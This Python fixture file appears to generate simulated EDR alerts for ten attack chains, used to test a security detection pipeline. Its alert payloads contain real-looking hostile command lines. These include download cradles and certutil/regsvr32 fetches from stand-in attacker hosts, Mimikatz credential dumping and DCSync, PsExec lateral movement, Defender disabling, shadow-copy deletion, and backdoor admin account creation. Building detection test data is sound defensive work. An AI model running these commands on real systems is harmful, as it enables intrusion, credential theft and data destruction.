"""Attack Scenario Library — 10 realistic multi-step attack chains.

Each scenario generates 4-6 cases that form a coherent attack chain,
with realistic rawAlert payloads that exercise the full enrichment
pipeline (sysmon translator MITRE patterns, entity graph relationship
extraction, threat intel lookups, signal extractors, scoring).

Purpose:
  1. Golden dataset for regression testing (prevents quality drops)
  2. Entity graph seeding (attack chains add cross-host relationships)
  3. Learning loop calibration (TP-labeled cases give real ground truth)
  4. Validates that our 62 MITRE patterns fire on actual attack telemetry

Usage:
  from backend.app.fixtures.attack_scenarios import get_all_scenarios
  scenarios = get_all_scenarios()
  for scenario in scenarios:
      for case_dict in scenario["cases"]:
          # POST to /api/v1/cases or call create_case() directly

Total: ~50 cases across 10 scenarios, covering 30+ MITRE techniques.
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
from typing import Any


def _ts(hours_ago: float = 0) -> str:
    """ISO timestamp N hours ago from now (UTC)."""
    dt = datetime.now(timezone.utc) - timedelta(hours=hours_ago)
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def _case(
    alert_type: str,
    severity: str,
    title: str,
    raw_alert: dict[str, Any],
    scenario_name: str,
    step: int,
    mitre_technique: str,
    hours_ago: float = 0,
    source_id_suffix: str = "",
) -> dict[str, Any]:
    """Build a single case dict compatible with CreateCaseRequest."""
    return {
        "tenantId": "attack-sim",
        "customer": {"name": "Attack Sim Corp", "environment": "prod", "industry": "finance"},
        "alertType": alert_type,
        "severity": severity,
        "title": title,
        "source": {
            "sourceSystem": "edr",
            "sourceName": "AttackSim",
            "sourceAlertId": f"atk-{scenario_name}-{step}{source_id_suffix}",
            "sourceSeverity": severity,
        },
        "eventTime": _ts(hours_ago),
        "rawAlert": {
            **raw_alert,
            "_attackScenario": scenario_name,
            "_attackStep": step,
            "_mitreTechnique": mitre_technique,
        },
    }


# ── Scenario 1: Credential Dumping + Lateral Movement ────────────────────

def scenario_credential_dumping() -> dict[str, Any]:
    user = "alice@contoso.com"
    ws = "ALICE-WS"
    dc = "DC-01"
    attacker_ip = "185.220.101.42"
    name = "cred_dump_lateral"
    return {
        "name": name,
        "description": "APT-style credential dump: phishing -> download cradle -> Mimikatz -> PsExec to DC -> DCSync",
        "mitre_tactics": ["initial-access", "execution", "credential-access", "lateral-movement"],
        "cases": [
            _case("identity.suspiciousSignIn", "high",
                  f"Suspicious sign-in: {user} from Russia",
                  {"identity": {"identityType": "user", "upn": user, "riskLevel": "high",
                                "displayName": "Alice Contoso"},
                   "ips": [{"role": "anomalous", "ipAddress": attacker_ip,
                            "geo": {"country": "RU", "city": "Moscow"}}],
                   "device": {"hostname": ws, "managed": True, "os": "Windows"}},
                  name, 1, "T1566.001", hours_ago=6),

            _case("endpoint.powershellExecution", "high",
                  f"PowerShell download cradle on {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "process": "powershell.exe", "_sourceName": "Sysmon",
                   "commandLine": f"IEX(New-Object Net.WebClient).DownloadString('http://{attacker_ip}/payload.ps1')",
                   "_sourceEventId": 1},
                  name, 2, "T1059.001", hours_ago=5.5),

            _case("endpoint.credentialDumping", "critical",
                  f"Mimikatz credential dump on {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "process": "powershell.exe", "_sourceName": "Sysmon",
                   "commandLine": "privilege::debug; sekurlsa::logonpasswords",
                   "file": {"fileName": "mimikatz.exe", "filePath": f"C:\\Temp\\mimikatz.exe"}},
                  name, 3, "T1003.001", hours_ago=5),

            _case("endpoint.lateralMovement", "critical",
                  f"PsExec lateral movement {ws} -> {dc}",
                  {"identity": {"upn": user},
                   "device": {"hostname": ws},
                   "process": "psexec.exe", "_sourceName": "Sysmon",
                   "commandLine": f"psexec.exe \\\\{dc} -u admin cmd.exe",
                   "dst_ip": "10.0.0.1"},
                  name, 4, "T1569.002", hours_ago=4.5),

            _case("endpoint.credentialDumping", "critical",
                  f"DCSync attack on {dc}",
                  {"identity": {"upn": user}, "device": {"hostname": dc},
                   "process": "mimikatz.exe", "_sourceName": "Sysmon",
                   "commandLine": "lsadump::dcsync /domain:contoso.com /user:krbtgt",
                   "_additionalContext": "dcsync krbtgt domain controller"},
                  name, 5, "T1003.003", hours_ago=4),
        ],
    }


# ── Scenario 2: Ransomware Deployment ────────────────────────────────────

def scenario_ransomware() -> dict[str, Any]:
    user = "compromised-admin@contoso.com"
    server = "FILE-SVR-01"
    name = "ransomware"
    return {
        "name": name,
        "description": "Ransomware: encoded PS -> disable Defender -> delete shadows -> mass encryption",
        "mitre_tactics": ["execution", "defense-evasion", "impact"],
        "cases": [
            _case("endpoint.powershellExecution", "high",
                  f"Encoded PowerShell on {server}",
                  {"identity": {"upn": user}, "device": {"hostname": server},
                   "process": "powershell.exe", "_sourceName": "Sysmon",
                   "commandLine": "powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA=="},
                  name, 1, "T1059.001", hours_ago=3),

            _case("endpoint.defenseEvasion", "critical",
                  f"Windows Defender disabled on {server}",
                  {"identity": {"upn": user}, "device": {"hostname": server},
                   "process": "powershell.exe", "_sourceName": "Sysmon",
                   "commandLine": "Set-MpPreference -DisableRealtimeMonitoring $true"},
                  name, 2, "T1562.001", hours_ago=2.8),

            _case("endpoint.ransomwareDetection", "critical",
                  f"Shadow copy deletion on {server}",
                  {"identity": {"upn": user}, "device": {"hostname": server},
                   "process": "vssadmin.exe", "_sourceName": "Sysmon",
                   "commandLine": "vssadmin.exe delete shadows /all /quiet",
                   "_additionalContext": "ransomware shadow copy deletion encrypt"},
                  name, 3, "T1490", hours_ago=2.5),

            _case("endpoint.massFileCreate", "critical",
                  f"Mass file encryption on {server}",
                  {"identity": {"upn": user}, "device": {"hostname": server},
                   "_fileCreateCount": 500, "_fileCreateDirectory": "D:\\Shared",
                   "_fileCreateExtensions": [".encrypted", ".locked"],
                   "_fileCreateExamples": ["report.xlsx.encrypted", "budget.docx.locked"],
                   "_additionalContext": "ransomware mass file encryption"},
                  name, 4, "T1486", hours_ago=2),
        ],
    }


# ── Scenario 3: Insider Data Exfiltration ────────────────────────────────

def scenario_insider_exfil() -> dict[str, Any]:
    user = "disgruntled-emp@contoso.com"
    ws = "EMP-LAPTOP"
    name = "insider_exfil"
    return {
        "name": name,
        "description": "Insider exfil: after-hours logon -> bulk file copy -> cloud upload -> email forward",
        "mitre_tactics": ["initial-access", "collection", "exfiltration"],
        "cases": [
            _case("identity.suspiciousSignIn", "medium",
                  f"After-hours logon: {user}",
                  {"identity": {"upn": user, "riskLevel": "medium"},
                   "device": {"hostname": ws, "managed": True, "os": "Windows"},
                   "ips": [{"role": "anomalous", "ipAddress": "10.0.5.22"}],
                   "_insiderResignation": True},
                  name, 1, "T1078", hours_ago=26),

            _case("network.dataExfiltration", "high",
                  f"Bulk upload to Dropbox from {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "ips": [{"role": "anomalous", "ipAddress": "162.125.66.1"}],
                   "_transferSizeMB": 2500, "_itemCount": 340,
                   "_additionalContext": "personal cloud storage dropbox bulk upload",
                   "destinationDomain": "dropbox.com"},
                  name, 2, "T1567.002", hours_ago=25),

            _case("email.forwardingRule", "high",
                  f"Email forward rule created by {user}",
                  {"identity": {"upn": user},
                   "mailbox": {"primaryAddress": user,
                               "ruleName": "Auto-forward",
                               "forwardingAddress": "personal@gmail.com"},
                   "ips": [{"role": "anomalous", "ipAddress": "10.0.5.22"}]},
                  name, 3, "T1114.003", hours_ago=24),
        ],
    }


# ── Scenario 4: LOLBin Abuse Chain ───────────────────────────────────────

def scenario_lolbin_chain() -> dict[str, Any]:
    ws = "DEV-WS-03"
    user = "dev-user@contoso.com"
    name = "lolbin_chain"
    return {
        "name": name,
        "description": "LOLBin abuse: certutil download -> rundll32 JS -> regsvr32 squiblydoo -> schtasks persist",
        "mitre_tactics": ["execution", "defense-evasion", "persistence"],
        "cases": [
            _case("endpoint.suspiciousProcess", "high",
                  f"Certutil file download on {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "process": "certutil.exe", "_sourceName": "Sysmon",
                   "commandLine": "certutil.exe -urlcache -split -f https://evil.example.com/implant.exe C:\\Temp\\implant.exe",
                   "file": {"fileName": "certutil.exe"}},
                  name, 1, "T1105", hours_ago=8),

            _case("endpoint.suspiciousProcess", "high",
                  f"Rundll32 JavaScript execution on {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "process": "rundll32.exe", "_sourceName": "Sysmon",
                   "commandLine": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "',
                   "file": {"fileName": "rundll32.exe"}},
                  name, 2, "T1218.011", hours_ago=7.5),

            _case("endpoint.suspiciousProcess", "high",
                  f"Regsvr32 Squiblydoo on {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "process": "regsvr32.exe", "_sourceName": "Sysmon",
                   "commandLine": "regsvr32 /s /u /i:https://evil.example.com/file.sct scrobj.dll",
                   "file": {"fileName": "regsvr32.exe"}},
                  name, 3, "T1218.010", hours_ago=7),

            _case("endpoint.persistenceMechanism", "high",
                  f"Scheduled task persistence on {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "process": "schtasks.exe", "_sourceName": "Sysmon",
                   "commandLine": "schtasks /create /sc minute /mo 5 /tn EvilTask /tr C:\\Temp\\implant.exe",
                   "_scheduledTaskCreated": True},
                  name, 4, "T1053.005", hours_ago=6.5),
        ],
    }


# ── Scenario 5: Active Directory Takeover ────────────────────────────────

def scenario_ad_takeover() -> dict[str, Any]:
    user = "it-admin@contoso.com"
    dc = "DC-01"
    name = "ad_takeover"
    return {
        "name": name,
        "description": "AD takeover: recon -> Kerberoast -> account creation -> group add -> GPO mod",
        "mitre_tactics": ["discovery", "credential-access", "persistence", "privilege-escalation"],
        "cases": [
            _case("endpoint.suspiciousProcess", "medium",
                  f"AD enumeration from {dc}",
                  {"identity": {"upn": user}, "device": {"hostname": dc},
                   "process": "powershell.exe", "_sourceName": "Sysmon",
                   "commandLine": "Get-ADUser -Filter * -Properties *; Get-ADGroup -Filter *; nltest /dclist:contoso.com"},
                  name, 1, "T1087.002", hours_ago=12),

            _case("endpoint.credentialDumping", "critical",
                  f"Kerberoasting on {dc}",
                  {"identity": {"upn": user}, "device": {"hostname": dc},
                   "process": "rubeus.exe", "_sourceName": "Sysmon",
                   "commandLine": "Rubeus.exe kerberoast /outfile:hashes.txt",
                   "_additionalContext": "kerberoasting service principal names"},
                  name, 2, "T1558.003", hours_ago=11),

            _case("identity.accountCreation", "high",
                  f"Backdoor account created on {dc}",
                  {"identity": {"upn": user}, "device": {"hostname": dc},
                   "_sourceName": "WindowsEventLog", "_sourceEventId": 4720,
                   "_accountCreated": True, "_newAccountName": "svc-backdoor",
                   "commandLine": "net user svc-backdoor P@ssw0rd123 /add"},
                  name, 3, "T1136.001", hours_ago=10),

            _case("identity.privilegeElevation", "critical",
                  f"Backdoor added to Domain Admins",
                  {"identity": {"upn": "svc-backdoor@contoso.com",
                                "newPrivilegeTier": "admin"},
                   "actor": {"upn": user},
                   "device": {"hostname": dc},
                   "_sourceName": "WindowsEventLog", "_sourceEventId": 4728,
                   "_targetGroup": "Domain Admins", "_privilegeEscalation": True,
                   "commandLine": 'net localgroup "Domain Admins" svc-backdoor /add'},
                  name, 4, "T1098", hours_ago=9.5),
        ],
    }


# ── Scenario 6: WMI Persistence + State Drift ───────────────────────────

def scenario_wmi_persistence() -> dict[str, Any]:
    ws = "FINANCE-WS-02"
    user = "finance-user@contoso.com"
    name = "wmi_persistence"
    return {
        "name": name,
        "description": "Persistence: new service (unusual path) -> WMI subscription -> registry autorun -> state drift detected",
        "mitre_tactics": ["persistence", "execution"],
        "cases": [
            _case("endpoint.persistenceMechanism", "high",
                  f"Suspicious service installed on {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "process": "sc.exe", "_sourceName": "Sysmon",
                   "commandLine": "sc.exe create EvilSvc binPath= C:\\Users\\Public\\svchost32.exe",
                   "_serviceCreated": True},
                  name, 1, "T1543.003", hours_ago=20),

            _case("endpoint.wmiPersistence", "critical",
                  f"WMI event subscription on {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "_sourceName": "Sysmon", "_sourceEventId": 19,
                   "_wmiPersistence": True},
                  name, 2, "T1546.003", hours_ago=19),

            _case("endpoint.stateDrift", "medium",
                  f"State drift: new autorun detected on {ws}",
                  {"device": {"hostname": ws},
                   "_stateCategory": "autorun", "_driftAction": "added",
                   "_driftItem": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EvilStartup",
                   "_driftDetails": {"target": "C:\\Users\\finance-user\\AppData\\Roaming\\evil.exe"}},
                  name, 3, "T1547.001", hours_ago=18),
        ],
    }


# ── Scenario 7: DNS Tunneling C2 ────────────────────────────────────────

def scenario_dns_tunneling() -> dict[str, Any]:
    ws = "SALES-WS-01"
    user = "sales-user@contoso.com"
    name = "dns_tunnel"
    return {
        "name": name,
        "description": "DNS tunneling C2: suspicious DNS queries -> dnscat2 detected -> data exfil via DNS",
        "mitre_tactics": ["command-and-control", "exfiltration"],
        "cases": [
            _case("network.dnsAnomaly", "high",
                  f"High-entropy DNS queries from {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "ips": [{"role": "anomalous", "ipAddress": "10.0.3.15"}],
                   "domain": "a8f3k2x9.evil-tunnel.example.com",
                   "_additionalContext": "dns tunneling high entropy subdomain dnscat2",
                   "_dstDomain": "evil-tunnel.example.com"},
                  name, 1, "T1071.004", hours_ago=15),

            _case("network.commandAndControl", "critical",
                  f"C2 beacon traffic from {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "ips": [{"role": "anomalous", "ipAddress": "198.51.100.77"}],
                   "_additionalContext": "command and control beacon dnscat2 dns tunnel",
                   "process": "dnscat2.exe", "domain": "evil-tunnel.example.com"},
                  name, 2, "T1572", hours_ago=14),

            _case("network.dataExfiltration", "critical",
                  f"Data exfiltration via DNS from {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "_transferSizeMB": 150, "_itemCount": 45,
                   "_additionalContext": "dns tunnel exfiltration txt records covert channel",
                   "destinationDomain": "evil-tunnel.example.com"},
                  name, 3, "T1048.003", hours_ago=13),
        ],
    }


# ── Scenario 8: BEC (Business Email Compromise) ─────────────────────────

def scenario_bec() -> dict[str, Any]:
    user = "cfo@contoso.com"
    name = "bec"
    return {
        "name": name,
        "description": "BEC: foreign sign-in -> MFA fatigue -> inbox rule -> payment redirect",
        "mitre_tactics": ["initial-access", "persistence", "impact"],
        "cases": [
            _case("identity.suspiciousSignIn", "high",
                  f"Suspicious sign-in: {user} from Nigeria",
                  {"identity": {"upn": user, "riskLevel": "critical",
                                "displayName": "CFO", "privilegeTier": "admin"},
                   "ips": [{"role": "anomalous", "ipAddress": "41.190.2.33",
                            "geo": {"country": "NG", "city": "Lagos"}},
                           {"role": "anomalous", "ipAddress": "10.0.0.50",
                            "geo": {"country": "US", "city": "New York"}}],
                   "device": {"hostname": "UNKNOWN", "managed": False, "os": "iOS"}},
                  name, 1, "T1078.004", hours_ago=48),

            _case("identity.mfaFatigue", "high",
                  f"MFA fatigue attack against {user}",
                  {"identity": {"upn": user, "mfaStatus": "disabled"},
                   "ips": [{"role": "anomalous", "ipAddress": "41.190.2.33"}],
                   "mfaPrompts": {"eventualSuccess": True},
                   "_additionalContext": "mfa fatigue push denial multiple push mfa bomb"},
                  name, 2, "T1621", hours_ago=47),

            _case("email.forwardingRule", "high",
                  f"Inbox rule: forward all from {user}",
                  {"identity": {"upn": user},
                   "mailbox": {"primaryAddress": user,
                               "ruleName": "Auto-Archive",
                               "forwardingAddress": "cfo-assistant@gmail.com"},
                   "ips": [{"role": "anomalous", "ipAddress": "41.190.2.33"}]},
                  name, 3, "T1114.003", hours_ago=46),

            _case("email.businessEmailCompromise", "critical",
                  f"Payment redirect email from {user}",
                  {"identity": {"upn": user},
                   "_additionalContext": "wire transfer payment redirect vendor invoice change bank account"},
                  name, 4, "T1534", hours_ago=45),
        ],
    }


# ── Scenario 9: UAC Bypass + Process Injection ──────────────────────────

def scenario_uac_bypass() -> dict[str, Any]:
    ws = "HR-WS-01"
    user = "hr-user@contoso.com"
    name = "uac_bypass"
    return {
        "name": name,
        "description": "UAC bypass: fodhelper -> process injection -> remote access tool install",
        "mitre_tactics": ["privilege-escalation", "defense-evasion", "command-and-control"],
        "cases": [
            _case("endpoint.suspiciousProcess", "high",
                  f"UAC bypass via fodhelper on {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "process": "powershell.exe", "_sourceName": "Sysmon",
                   "commandLine": "powershell -Command Start-Process fodhelper.exe",
                   "_parentProcess": "explorer.exe"},
                  name, 1, "T1548.002", hours_ago=10),

            _case("endpoint.suspiciousProcess", "critical",
                  f"Process injection on {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "process": "powershell.exe", "_sourceName": "Sysmon",
                   "commandLine": "Invoke-Func CreateRemoteThread + WriteProcessMemory + VirtualAllocEx"},
                  name, 2, "T1055", hours_ago=9.5),

            _case("endpoint.suspiciousProcess", "high",
                  f"AnyDesk RAT installed on {ws}",
                  {"identity": {"upn": user}, "device": {"hostname": ws},
                   "process": "anydesk.exe", "_sourceName": "Sysmon",
                   "commandLine": "C:\\Temp\\anydesk.exe --install --silent"},
                  name, 3, "T1219", hours_ago=9),
        ],
    }


# ── Scenario 10: Cloud OAuth Consent Phishing ───────────────────────────

def scenario_oauth_phishing() -> dict[str, Any]:
    user = "exec@contoso.com"
    name = "oauth_phish"
    return {
        "name": name,
        "description": "OAuth consent phishing: malicious app consent -> mail read -> data exfil to attacker tenant",
        "mitre_tactics": ["initial-access", "collection", "exfiltration"],
        "cases": [
            _case("identity.oauthConsentRisk", "high",
                  f"Suspicious OAuth consent by {user}",
                  {"identity": {"upn": user, "riskLevel": "high"},
                   "app": {"appId": "app-evil-001", "name": "Contoso Document Viewer",
                           "publisher": "Evil Corp LLC",
                           "scopes": ["Mail.ReadWrite", "Files.ReadWrite.All",
                                      "User.ReadWrite.All", "offline_access"]},
                   "ips": [{"role": "anomalous", "ipAddress": "203.0.113.55"}]},
                  name, 1, "T1528", hours_ago=72),

            _case("cloud.secretStoreAccessAnomaly", "critical",
                  f"Mailbox scraping via OAuth app for {user}",
                  {"identity": {"upn": user, "servicePrincipalId": "sp-evil-001"},
                   "app": {"appId": "app-evil-001", "name": "Contoso Document Viewer"},
                   "_additionalContext": "oauth mail read all messages bulk export"},
                  name, 2, "T1114.002", hours_ago=70),

            _case("network.dataExfiltration", "critical",
                  f"Data exfiltration to external tenant",
                  {"identity": {"upn": user},
                   "_transferSizeMB": 800, "_itemCount": 1200,
                   "_additionalContext": "data exfiltration external tenant bulk export personal cloud",
                   "ips": [{"role": "anomalous", "ipAddress": "203.0.113.55"}],
                   "destinationDomain": "evil-corp-storage.example.com"},
                  name, 3, "T1567.002", hours_ago=68),
        ],
    }


# ── Registry ─────────────────────────────────────────────────────────────

ALL_SCENARIOS = [
    scenario_credential_dumping,
    scenario_ransomware,
    scenario_insider_exfil,
    scenario_lolbin_chain,
    scenario_ad_takeover,
    scenario_wmi_persistence,
    scenario_dns_tunneling,
    scenario_bec,
    scenario_uac_bypass,
    scenario_oauth_phishing,
]


def get_all_scenarios() -> list[dict[str, Any]]:
    """Return all 10 attack scenarios with their case lists."""
    return [fn() for fn in ALL_SCENARIOS]


def get_total_case_count() -> int:
    """Return the total number of cases across all scenarios."""
    return sum(len(s["cases"]) for s in get_all_scenarios())
